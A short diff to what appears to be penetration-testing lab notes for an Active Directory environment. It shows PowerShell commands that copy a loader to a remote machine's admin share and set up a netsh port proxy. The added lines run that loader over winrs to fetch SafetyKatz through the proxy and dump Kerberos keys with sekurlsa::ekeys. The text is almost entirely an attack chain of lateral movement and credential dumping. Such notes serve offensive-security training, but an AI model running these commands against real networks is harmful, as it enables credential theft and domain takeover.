@@ -25,3 +25,7 @@ echo F | xcopy C:\Users\Public\Loader.exe \\<R MACHINE>\C$\Users\Public\Loader.e
 ```powershell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
 ```
+Download and use program
+```powershell
+$null | winrs -r:<MACCHINA> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
